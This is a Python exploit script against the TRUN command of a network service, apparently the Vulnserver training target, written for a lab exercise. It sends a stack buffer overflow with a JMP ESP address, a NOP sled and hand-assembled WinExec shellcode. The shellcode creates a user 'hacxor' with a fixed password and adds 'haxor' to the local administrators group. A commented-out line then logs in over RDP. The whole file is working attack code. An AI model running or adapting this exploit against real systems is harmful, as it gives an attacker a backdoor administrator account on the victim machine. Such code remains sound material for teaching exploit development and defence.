import socket
import sys
import subprocess

ip = sys.argv[1]
port = int(sys.argv[2])

overflow_size = 2006
jmp = "\xAF\x11\x50\x62"
nop_sled = 32


# sp&spsp net localgroup administrators haxor /add
# / a d d 		2f 61 64 64
# x o r sp 		78 6f 72 20
# s sp h a 		73 20 68 61
# a t o r 		61 74 6f 72
# i s t r 		69 73 74 72
# d m i n 		64 6d 69 6e
# u p sp a 		75 70 20 61
# l g r o 		6c 67 72 6f
# l o c a 		6c 6f 63 61
# n e t sp 		6e 65 74 20
# sp & sp sp 	20 26 20 20

# net user hacxor password /add

# / a d d   	2f 61 64 64
# o r d sp  	6f 72 64 20
# a s s w   	61 73 73 77
# o r sp p  	6f 72 20 70
# sp h a x  	20 68 61 78
# u s e r   	75 73 65 72
# n e t sp		6e 65 74 20

payload = ""
# SUFFIX: APPEND A NULL BYTE TO TERMINATE WINEXEC ARG
payload+= "\x33\xC0"					# xor eax,eax two things together to get 0	xor eax with itself NOTE: 0s out eax register
payload+= "\x50"						# push eax	NOTE: adds null byte onto the stack

# END OF DOS COMMAND 1
payload+=	"\x68\x2F\x61\x64\x64"      # push(68) /add  		2F616464
payload+=	"\x68\x6F\x72\x64\x20"      # push(68) ordsp 		6F726420
payload+=	"\x68\x61\x73\x73\x77"      # push(68) assw  		61737377
payload+=	"\x68\x6F\x72\x20\x70"      # push(68) orspp 		6f722070
payload+=	"\x68\x20\x68\x61\x78"      # push(68) sphax 		20686178
payload+=	"\x68\x75\x73\x65\x72"      # push(68) user  		75736572
payload+=	"\x68\x6E\x65\x74\x20"      # push(68) netsp 		6E657420
# BEGINNING OF DOS COMMAND 1

# END OF WINEXEC CALL SET UP
payload += "\x8B\xC4"					# mov eax, esp stack pointer will be pointing at the beginning of instruction in assembly
										# NOTE: moving address of dos cmd in eax
payload += "\x6A\x01" 					# push 1    NOTE: Second argv to WinExec.
payload += "\x50" 						# push  eax NOTE: addr in eax.  first argv to WinExec.  push the contents of eax onto the stack
#payload += "\xBB\xAD\x23\x86\x7C" 		# for my vw in xp
payload += "\xBB\x87\x30\x47\x76" 		# mov ebx, [7C8623AD] #76 47 30 87 for lab 115 windows 8
payload += "\xFF\xD3" 					# call ebx
# BEGINNING OF WINEXEC CALL SET UP

# GENERATE A NULL BYTE
payload+= "\x33\xC0"						# xor eax,eax two things together to get 0	xor eax with itself NOTE: 0s out eax register
payload+= "\x50"

# END OF DOS COMMAND 1
payload+=	"\x68\x2F\x61\x64\x64"      # push(68) /add 		2f616464
payload+=	"\x68\x78\x6F\x72\x20"      # push(68) xorsp 		786f7220
payload+=	"\x68\x73\x20\x68\x61"      # push(68) spha 		73206861
payload+=	"\x68\x61\x74\x6F\x72"      # push(68) ator 		61746f72
payload+=	"\x68\x69\x73\x74\x72"      # push(68) istr 		69737472
payload+=	"\x68\x64\x6D\x69\x6E"      # push(68) dmin 		646d696e
payload+=	"\x68\x75\x70\x20\x61"      # push(68) upspa 		75702061
payload+=	"\x68\x6C\x67\x72\x6F"      # push(68) lgro 		6c67726f
payload+=	"\x68\x6C\x6F\x63\x61"      # push(68) loca 		6c6f6361
payload+=	"\x68\x6E\x65\x74\x20"      # push(68) netsp 		6e657420
# BEGINNIS OF DOS COMMAND   1


# END OF WINEXEC CALL SET UP
payload += "\x8B\xC4"					# mov eax, esp stack pointer will be pointing at the beginning of instruction in assembly
										# NOTE: moving address of dos cmd in eax
payload += "\x6A\x01" 					# push 1    NOTE: Second argv to WinExec.
payload += "\x50" 						# push  eax NOTE: addr in eax.  first argv to WinExec.  push the contents of eax onto the stack
#payload += "\xBB\xAD\x23\x86\x7C" 		# for my vw in xp
payload += "\xBB\x87\x30\x47\x76" 		# mov ebx, [7C8623AD] #76 47 30 87 for lab 115 windows 8
payload += "\xFF\xD3" 					# call ebx
# BEGINNIG OF WINEXEC CALL SET UP 

bad_cmd = "TRUN ." + "A" * overflow_size + jmp + "\x90" * nop_sled + payload

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(5)
	s.connect((ip,port))
	data = s.recv(4096)
	print data
	print "[*] sending attack"
	s.send(bad_cmd)
	s.close()
except:
	print "[*] TANGO DOWN"
	#subprocess.check_output("rdesktop -u haxor -p password %s" % ip, shell=True)